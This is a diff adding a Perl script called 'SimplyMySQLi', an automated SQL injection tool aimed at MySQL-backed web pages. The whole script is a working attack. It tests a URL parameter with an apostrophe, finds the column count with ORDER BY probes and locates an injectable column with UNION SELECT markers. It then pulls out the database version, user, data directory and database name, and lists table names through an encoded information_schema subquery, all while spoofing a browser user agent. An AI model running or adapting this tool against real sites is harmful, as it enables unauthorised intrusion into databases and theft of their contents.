@@ -1,0 +1,216 @@
+#!/usr/bin/perl -w
+use LWP::UserAgent; use Term::ANSIColor;
+my @params; # used to get vulnerable column
+my @tables; # for pwnt table list
+my $attkUrl; # URL to manipulate for attack
+my $urlArg; # URL supplied by attacker 
+my $agent = "Mozilla/5.0 (Windows; U; Windows"
+	." NT 5.1; en-US; rv:1.9.0.1) Gecko/2"
+	. "008070208 Firefox/3.0.1"; # spoof to User Agent
+my $result; # global result to keep returning
+my $colpwnt = 0; # boolen: was the column count found?
+my @subQuery; # To create the sub query string
+my $vulnCol = 0; # WHich column is vulnerable to inject with?
+my $param = ""; # parameter parsing
+my $qCnt = 0; # for amount of requests we send
+# Start Hacking:
+if($ARGV[0]){ # have we supplied the proper arguments?
+	argParse();
+}else{
+	usage(); # nope.
+}
+name();
+$param = $urlArg; # show the param we will attack
+$param =~ s/http:.*(\?|\&)([A-Za-z0-9_.-]+)=[0-9]+.*/$2/;
+# in one fell swoop, check if host up
+# host vuln to injection, and host is MySQL:
+$attkUrl = $urlArg; # reset modifiable URL
+$attkUrl =~ s/=([0-9]+).*/=$1'/; # put in a sneeky apostrophe
+print "\n +->>> VERIFICATION <<<-+\n\n";
+print " +-> Verifying host with URL:\n `-> " . $attkUrl . "\n";
+query($attkUrl);  # query it with the apostrophe
+if($res->is_success){
+	print " +-> Host seems up and answering our calls\n";
+	if($rcon =~ m/error.*mysql.server.version/i){
+		print " +-> MySQL server verified\n";
+	}elsif($rcon =~ m/connect to local MySQL server through socket/i){
+		print " +-> MySQL server is down!\n";
+	}else{
+		print " +-X My method does not show MySQL Server.\n";
+		print "\n\n " . $rcon . "\n\n";
+		if($rcon =~ /Notice: Undefined index: id/){
+			print " +-X Did you mangle the URL? Does ";
+			bold($param);
+			print " exist?\n\n";
+		}
+		exit();
+	}
+	# we can continue
+}else{
+	print " +-X Host seems down!\n";
+	exit(); # no where to go, *die*
+}
+print " +-> Attacking parameter: ";bold($param);print "\n";
+print "\n +->>> SERVER INFO <<<-+\n\n";
+# Get the column count:
+for(my $i=1;$i<=32;$i++){ # 32 is a good number to give up on ;)
+	$attkUrl = $urlArg; # rest the URL
+	$attkUrl =~ s/=([0-9]+).*/=$1 order by $i --/; # try without negative
+	query($attkUrl);
+	if($rcon =~ m/unknown.column.+order.clause/i){
+		$colCount = ($i - 1);
+		print " +-> Column count is: ";bold($colCount);print "\n";
+		my $colpwnt = 1;
+		last;
+	}
+	if($i == 32){
+		print " +-X Could not find column count.\n";
+		exit();
+	}
+}
+# We should now have the column count, let's create the subQuery string:
+# NULL out the array:
+nullArr();
+# dynamically find vulnerable column:
+# Here I had to use database(); function, because @@version returned
+# a false positive on a few test servers
+for(my $i=0;$i<$colCount;$i++){
+	$vulnCol = $i;
+	# make the $i'th element a concat(); function:
+	$subQuery[$i] = "concat('0x31337_',database(),'_0x31337')";
+	attkUrl();
+	# create our string and query:
+	conSubQ('database()');
+	# was the query "successful?" ;)
+	if($rcon =~ m/0x31337_[a-z0-9._-]+_0x31337/i){
+		print " +-> Vulnerable column is: "; bold($i + 1); print "\n";
+		$vulnCol = ($i + 1);
+		payload();
+		print " +-> Current DB name: "; bold($payload); print "\n";
+		last;
+	}
+	nullArr();
+}
+# use this as a template for hacking this app:
+# getIt('what you want', 'name it something useful');
+getIt('version()','MySQL version');
+getIt('connection_id()','connection id');
+getIt('user()', 'current user');
+getIt('@@datadir','data directory for DB');
+$string = "%28%73%65%6C%65%63%74%20%54%41%42%4C%45%5F%4E%41%4D%45%20%66%"
+. "72%6F%6D%20%28%73%65%6C%65%63%74%20%40%72%3A%3D%40%72%2B%31%20%61%73%20%6"
+. "9%64%2C%54%41%42%4C%45%5F%4E%41%4D%45%20%66%72%6F%6D%20%28%73%65%6C%65%63"
+. "%74%20%40%72%3A%3D%30%29%20%72%2C%69%6E%66%6F%72%6D%61%74%69%6F%6E%5F%73%"
+. "63%68%65%6D%61%2E%74%61%62%6C%65%73%20%70%20%77%68%65%72%65%20%74%61%62%6"
+. "C%65%5F%72%6F%77%73%20%3E%20%31%29%20%6B%20%77%68%65%72%65%20%69%64%20%3D"
+. "%200x31337%29"; # '0x31337' will be used for hacking
+recurGet('Tables'); # pass (<TABLE|COLUMN>) to this after changing $string
+# Okay, let's try to recursively get the database tables:
+# This query I made up, it will make a variable "r" and a column called "id" on the fly
+# So that I can dump the payload - 1 field at a time :)
+sub recurGet{
+	print "\n +->>> " . $_[0] . " <<<-+\n\n";
+	conSubQ($strAtk);
+	# create sub query:
+	for($i=1;$i<=99;$i++){ # more than 99 tables = false positive?
+		attkUrl(); # reset attack Url
+		$strAtk = $string; # reset the sub query
+		$strAtk =~ s/0x31337/$i/; # 0x31337 will be used for hacking!
+		print "[DEBUG] STRATTK: " . $strAtk . "\n";
+		if($rcon =~ m/0x31337_[0-9A-Z._-]+_0x31337/i){
+			print "[DEBUG]: " . $attkUrl . "\n";
+			payload();
+			print " +-> " . $_[1] . " found: ";
+			bold($payload); print "\n";
+			if($_[0] eq 'Tables'){ push(@tables,$payload); }
+		}else{
+			print "[DEBUG]: " . $attkUrl . "\n";
+			last;
+		}
+	}
+}
+sub getIt{
+	attkUrl();
+	conSubQ($_[0]);
+	payload();
+	print " +-> Our " . $_[1] . " is ";bold($payload);print "\n";
+}
+sub attkUrl{
+	$attkUrl = $urlArg; # reset the modifiable URL
+	$attkUrl =~ s/=([0-9]+).*/=-$1 union select /;
+}
+# Construct our sub queries here:
+sub conSubQ{ # template:A
+	if($_[0] =~ m/(\(\)|^@@|%[0-9]+)/i){ # a function and query can't be quoted
+		$inj = 'concat(\'0x31337_\',' . $_[0] . ',\'_0x31337\')';	
+	}else{
+		$inj = 'concat(\'0x31337_\',\'' . $_[0] . '\',\'_0x31337\')';
+	}
+	nullArr(); # clear array and NULL it
+	$subQuery[$vulnCol] = $inj; # insert our template
+	$string = ''; # make it a string:
+	foreach(@subQuery){
+		$string .= $_ . ",";
+	}		
+	$string =~ s/,$//; # Done
+	$attkUrl .= $string . " --";
+	# print "DEBUG:  Attacking URL:" . $attkUrl . "\n";
+	query($attkUrl); # send it off to be processed!
+}
+sub payload{
+	$payload = $rcon;	
+	$payload =~ s/.*0x31337_(.+)_0x31337.*/$1/;
+	chomp $payload;
+}
+# the query!
+sub query{
+	$qCnt += 1;
+	# setup our HTTP request object:
+	my $ua = LWP::UserAgent->new;
+	$ua->agent($agent);
+	# grab the sent URL:
+	my $req = HTTP::Request->new(GET => $_[0]);
+	# Get the result and put into global:
+	$res = $ua->request($req);
+	$rcon = $res->content; # to save a few bytes ;)
+	$rcon =~ tr/\r\n//d;
+}
+sub bold{
+	print color 'bold white';
+	print $_[0];
+	print color 'reset';
+}
+sub nullArr{
+	@subQuery = (); # truncate it
+	for(my $i=0;$i<$colCount;$i++){
+		push(@subQuery, "NULL"); # make NULL strings
+	}
+}
+sub name{
+	print color 'bold cyan';
+	print "\n  SimplyMySQLi ";
+	print color 'reset';
+	print "- Lightweight MySQL Injection Tool\n  Coded by Douglas "
+	. " - WeakNetLabs\@gmail.com\n\n";
+}
+sub argParse{ # for our arguments:
+	for($i=0;$i<($#ARGV + 1);$i++){
+		if($ARGV[$i] eq '-u'){ $urlArg=$ARGV[$i+1]; }	
+		if($ARGV[$i] eq '-a'){ $agent=$ARGV[$i+1]; }	
+	}
+	# valid URL?
+	if($urlArg !~ m/http:\/\/.+/i){
+		print " +-X No valid URL specified\n";
+		usage();
+	}
+}
+
+sub usage{
+	name();
+	print "  Usage: ./smsi -u <url> -a <MO|IE|CH|FF>\n\n";
+	exit();
+}
+
+# Finish (clean up)
+print " +-> " . $qCnt . " HTTP requests in session.\n";
+print "\n";
